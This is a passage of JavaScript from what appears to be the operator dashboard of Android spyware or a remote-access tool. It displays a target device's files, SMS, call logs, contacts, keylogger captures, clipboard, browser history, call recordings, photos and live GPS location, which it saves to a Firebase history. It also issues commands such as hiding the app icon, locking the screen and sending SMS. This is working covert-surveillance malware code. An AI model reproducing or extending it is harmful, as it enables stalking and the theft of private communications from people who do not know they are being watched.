            <div class="file-row">
                <span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span>
                <span class="file-size">${formatBytes(f.size)}</span>
                <div class="file-actions">
                    <button class="file-action-btn dl" onclick="downloadIndividualFile('${escapeHtml(f.path)}')">⬇️</button>
                    <button class="file-action-btn del" onclick="deleteIndividualFile('${escapeHtml(f.path)}')">🗑️</button>
                </div>
            </div>
        </li>`; 
    });
    if(folders.length===0 && files.length===0) html+=`<li style="padding:10px 20px; color:#999; font-size:12px;">Empty folder</li>`;
    return html;
}

function renderFiles() {
    if(window.loadingFolderPath && window.loadingFolderPath !== 'root') {
        const encPath = btoa(encodeURIComponent(window.loadingFolderPath)).replace(/=/g,'');
        const container = document.getElementById(`tree-container-${encPath}`);
        const inner = document.getElementById(`tree-inner-${encPath}`);
        if(inner && container) {
            inner.innerHTML = renderFileTreeNodes(currentData, window.loadingFolderPath);
        }
        window.loadingFolderPath = null;
        return;
    }
    
    let html=`<div class="file-manager">
        <div class="file-toolbar-sticky">
            <h3 style="margin:0; font-size: 16px; display:flex; align-items:center; gap:8px;">📂 Device Filesystem</h3>
            <button onclick="refreshFileRoot()" style="margin-left:auto; background:var(--primary); color:white; border:none; padding:6px 12px; border-radius:var(--radius-sm); cursor:pointer;">⟲ Refresh Root</button>
        </div>
        <div class="tree-content"><ul class="tree-root" id="tree-root-container">`;
    html += renderFileTreeNodes(currentData, 'root');
    html += `</ul></div></div>`; 
    panel.innerHTML=html;
    window.loadingFolderPath = null;
}

window.handleFolderClick = function(headerElem, path) {
    const encPath = btoa(encodeURIComponent(path)).replace(/=/g,'');
    const container = document.getElementById(`tree-container-${encPath}`);
    const inner = document.getElementById(`tree-inner-${encPath}`);
    const chevron = headerElem.querySelector('.chevron');
    
    if(container.classList.contains('expanded')) {
        container.classList.remove('expanded');
        chevron.classList.remove('down');
    } else {
        chevron.classList.add('down');
        if(inner.innerHTML.trim() !== '') {
            container.classList.add('expanded');
        } else {
            inner.innerHTML = '<li style="padding:10px 20px; color:#999; font-size:12px;">Loading...</li>';
            container.classList.add('expanded');
            window.loadingFolderPath = path;
            sendCommand('LIST_FILES', {path: path});
        }
    }
};

// MAP & GEOFENCE
async function reverseGeocode(lat, lon, updateElementId) {
    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await res.json();
        const el = document.getElementById(updateElementId);
        if(el && data.display_name) el.innerText = data.display_name;
    } catch(e) { }
}

function renderMap(loc){
    let l=typeof loc==='string'?JSON.parse(loc):loc;
    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
    currentLocation={lat,lon,acc};
    
    // 15-min Firebase Location Storage Logic
    if(window._lastFirebaseSaveTime === undefined || (Date.now() - window._lastFirebaseSaveTime > 15 * 60 * 1000)) {
        if(typeof db !== 'undefined' && selectedDeviceId) {
            db.collection('locationHistory').add({
                deviceId: selectedDeviceId,
                lat: lat,
                lon: lon,
                accuracy: acc,
                timestamp: Date.now(),
                timeFmt: new Date().toLocaleString()
            }).catch(e=>console.log("Firebase Save Error:", e));
            window._lastFirebaseSaveTime = Date.now();
        }
    }

    panel.innerHTML=`
        <div style="margin-bottom:12px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;">
            <div style="font-weight:600;margin-bottom:4px;">📍 Current Location</div>
            <div id="liveMapAddress" style="font-size:13px;color:var(--text-sec);margin-bottom:8px;">Fetching address...</div>
            <div style="display:flex;gap:12px;align-items:center;">
                <span class="badge blue">${lat.toFixed(6)}, ${lon.toFixed(6)}</span>
                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" class="btn-ui secondary" style="text-decoration:none;font-size:12px;padding:4px 8px;">🗺️ View in Google Maps</a>
            </div>
        </div>
        <div id="map" style="height:380px;"></div><div class="map-info" style="top: auto; bottom: 20px;">🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
    
    reverseGeocode(lat, lon, 'liveMapAddress');

    if(mapInstance)mapInstance.remove();
    mapInstance=L.map('map').setView([lat,lon],18);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
    L.circle([lat,lon],{radius:acc,color:'#1976ff',fillColor:'#1976ff',fillOpacity:0.2}).addTo(mapInstance);
    L.marker([lat,lon],{icon:L.divIcon({className:'current-location-marker',iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Current Device Location');
}

function displayLocationHistory(data) {
    const container = panel.querySelector('#historyMainList');
    if(!container) return;
    
    if(!Array.isArray(data)||!data.length){ 
        container.innerHTML='<p style="color:var(--text-sec);">No history data found for this timeframe.</p>'; 
        document.getElementById('historyMap').style.display = 'none';
        return; 
    }
    
    locationHistoryDataGrouped = {};
    data.forEach(p => {
        let dateStr = 'Unknown Date';
        if(p.timeFmt) {
            dateStr = p.timeFmt.split(' ')[0];
        } else if (p.timestamp) {
            dateStr = new Date(p.timestamp).toLocaleDateString();
        }
        if(!locationHistoryDataGrouped[dateStr]) locationHistoryDataGrouped[dateStr] = [];
        locationHistoryDataGrouped[dateStr].push(p);
    });
    
    const dates = Object.keys(locationHistoryDataGrouped).sort((a,b) => new Date(b) - new Date(a));
    
    let html = `
        <h4 style="margin-bottom: 12px; font-weight:600; font-size: 16px;">Available Dates</h4>
        <table class="styled-table">
            <thead>
                <tr><th>Date</th><th>Recorded Points</th><th>Action</th></tr>
            </thead>
            <tbody>
                ${dates.map(d => `
                    <tr>
                        <td style="font-weight: 500;">${escapeHtml(d)}</td>
                        <td><span class="badge blue">${locationHistoryDataGrouped[d].length} points</span></td>
                        <td><button class="btn-ui secondary view-date-btn" data-date="${escapeHtml(d)}">View on Map</button></td>
                    </tr>
                `).join('')}
            </tbody>
        </table>
        <div id="dateDetailsPanel" style="margin-top:24px;"></div>
    `;
    container.innerHTML = html;
    
    container.querySelectorAll('.view-date-btn').forEach(btn => {
        btn.onclick = () => renderLocationHistoryForDate(btn.dataset.date);
    });
}

function renderLocationHistoryForDate(dateStr) {
    const points = locationHistoryDataGrouped[dateStr];
    if(!points || !window._historyMap) return;
    
    const mapDiv = document.getElementById('historyMap');
    mapDiv.style.display = 'block';
    setTimeout(() => { window._historyMap.invalidateSize(); }, 100);
    
    if(_historyPathLayer) window._historyMap.removeLayer(_historyPathLayer);
    _historyMarkers.forEach(m => window._historyMap.removeLayer(m));
    _historyMarkers = [];
    
    const coords = points.map(p => [p.lat, p.lon]);
    
    if(coords.length > 0) window._historyMap.fitBounds(coords, {padding: [50, 50]});
    
    if(coords.length > 1) {
        _historyPathLayer = L.polyline(coords, {color: '#0f62fe', weight: 4, opacity: 0.8}).addTo(window._historyMap);
    }
    
    points.forEach((p, i) => {
        let isStart = (i === points.length - 1);
        let isEnd = (i === 0);
        let color = '#0f62fe'; let radius = 5;
        if(isEnd) { color = '#da1e28'; radius = 7; }
        if(isStart) { color = '#198038'; radius = 7; }
        
        const marker = L.circleMarker([p.lat, p.lon], {
            radius: radius, color: '#fff', weight: 2, fillColor: color, fillOpacity: 1
        }).addTo(window._historyMap);
        
        const timeOnly = p.timeFmt ? p.timeFmt.split(' ').slice(1).join(' ') : 'Unknown Time';
        marker.bindPopup(`<b>${timeOnly}</b><br>${p.address || (p.lat.toFixed(5)+','+p.lon.toFixed(5))}`);
        _historyMarkers.push(marker);
    });
    
    const detailPanel = document.getElementById('dateDetailsPanel');
    detailPanel.innerHTML = `
        <h4 style="margin-bottom: 12px; font-weight:600; font-size:16px;">Timeline for ${escapeHtml(dateStr)}</h4>
        <div style="overflow-x:auto;">
            <table class="styled-table" style="font-size:13px;">
                <thead><tr><th>Time</th><th>Location</th><th>Coord</th></tr></thead>
                <tbody>
                    ${points.map(p => `
                        <tr>
                            <td style="white-space:nowrap;">${p.timeFmt ? p.timeFmt.split(' ').slice(1).join(' ') : ''}</td>
                            <td>${escapeHtml(p.address || 'Unknown Address')}</td>
                            <td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank" class="text-link">${p.lat.toFixed(4)}, ${p.lon.toFixed(4)}</a></td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    `;
}

// MESSAGE HANDLER
function handleJSON(json){
    if(Array.isArray(json)){
        if(pendingCommand==='LIST_FILES'){ currentData=json; renderFiles(); }
        else if(pendingCommand==='GET_SMS'){ displaySMS(json); }
        else if(pendingCommand==='GET_CALL_LOGS'){ const rows=json.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }
        pendingCommand=null; return;
    }
    switch(json.type){
        case 'FILE_LIST': try{ currentData=typeof json.data==='string'?JSON.parse(json.data):json.data; renderFiles(); }catch(e){} break;
        case 'SMS_DATA': try{ displaySMS(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_LOGS': try{ const d=typeof json.data==='string'?JSON.parse(json.data):json.data; const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){} break;
        case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
        case 'LOCATION_UPDATE': renderMap(json.data||json); break;
        case 'GEOFENCE_INFO': try{ displayGeofenceInfo(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'FILE_INFO': fileTransfers[json.transferId]={chunks:new Array(json.totalChunks),totalChunks:json.totalChunks,fileName:json.fileName,received:0}; document.getElementById('progressFileName').innerText=json.fileName; document.getElementById('progressPercent').innerText='0%'; document.getElementById('progressBar').style.width='0%'; document.getElementById('downloadProgress').style.display='block'; break;
        case 'FILE_CHUNK': const tr=fileTransfers[json.transferId]; if(!tr)return; setTimeout(()=>{ try{ const bin=atob(json.data), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks), url=URL.createObjectURL(blob), a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } }catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
        case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); break;
        case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); break;
        case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; showNotification('App icon hidden'); break;
        case 'APP_SHOWN': iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; showNotification('App icon shown'); break;
        case 'CONTACTS_DATA': try{ displayContacts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'INSTALLED_APPS': try{ displayInstalledApps(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_USAGE_DATA': try{ displayAppUsage(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'BROWSER_HISTORY_DATA': try{ displayBrowserHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'KEYLOG_DATA': try{ displayKeylog(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CLIPBOARD_DATA': try{ displayClipboard(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_RECORDINGS_DATA': try{ displayCallRecordings(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_AUDIO_DATA': try{ const ca=typeof json.data==='string'?JSON.parse(json.data):json.data; if(ca&&ca.audio) playCallRecording(ca); }catch(e){} break;
        case 'RECENT_IMAGES_DATA': try{ displayPhotoGallery(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'LOCATION_HISTORY_DATA': try{ displayLocationHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_EVENTS_DATA': try{ displayAppEvents(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_KEYWORDS_DATA': try{ displaySmsKeywords(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_ALERTS_DATA': try{ displaySmsAlerts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
        case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
        case 'GEOFENCE_ALERT': 
            const aMsg = json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone';
            const mHtml = `
            <div id="geofenceAlertModal" style="position:fixed;inset:0;background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);z-index:99999;display:flex;align-items:center;justify-content:center;">
                <div style="background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.2);min-width:300px;text-align:center;">
                    <h2 style="color:${json.event==='EXIT'?'#d32f2f':'#2e7d32'};margin-top:0;">Geofence Alert</h2>
                    <p style="font-size:16px;margin:16px 0;">${aMsg}</p>
                    <div style="display:flex;gap:12px;justify-content:center;margin-top:24px;">
                        <button onclick="document.getElementById('geofenceAlertModal').remove()" class="btn-ui secondary">Close</button>
                        <button onclick="document.getElementById('geofenceAlertModal').remove(); sendCommand('CLEAR_GEOFENCE')" class="btn-ui" style="background:#ff9800;color:#fff;">Clear Fence</button>
                    </div>
                </div>
            </div>`;
            document.body.insertAdjacentHTML('beforeend', mHtml);
            pushAlert('Geofence',aMsg); 
            break;
        case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
        case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
        case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
        case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
        case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); break;
        case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
        case 'GPS_UPDATES_STOPPED': liveGpsActive=false; const gpsBtn=document.getElementById('liveGpsBtn'); if(gpsBtn){ gpsBtn.querySelector('span:last-child').textContent='Live GPS Track'; gpsBtn.style.cssText=''; } showNotification('GPS tracking stopped'); break;
        case 'NOTIFICATION_LIVE': pushAlert('📳 '+(json.app||'App'),(json.title||'')+': '+(json.text||'')); break;
        case 'CALL_ALERT': if(json.event==='RINGING') pushAlert('📞 Incoming Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); else if(json.event==='MISSED') pushAlert('📵 Missed Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); break;
        case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: '+json.keyword,'From '+json.from+': '+json.body); break;
        case 'HEARTBEAT': break;
        default: console.log('Unhandled type:',json.type);
    }
    pendingCommand=null;
}
function handlePlainText(msg){
    if(msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
    else if(msg.startsWith("FLASH_ON")){ flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); }
    else if(msg.startsWith("FLASH_OFF")){ flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
    else if(msg.startsWith("LOC_DATA:")) try{ renderMap(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("SMS_DATA:")) try{ displaySMS(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("CALL_DATA:")) try{ const d=JSON.parse(msg.substring(10)); const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){}
    else if(msg.startsWith('[')||msg.startsWith('{')) try{ handleJSON(JSON.parse(msg)); }catch(e){}
}
function handleIncomingMessage(msg){
    try{ const j=JSON.parse(msg); if(j.type==='SIGNALING') handleSignaling(j.data); else handleJSON(j); }catch(e){ handlePlainText(msg); }
}
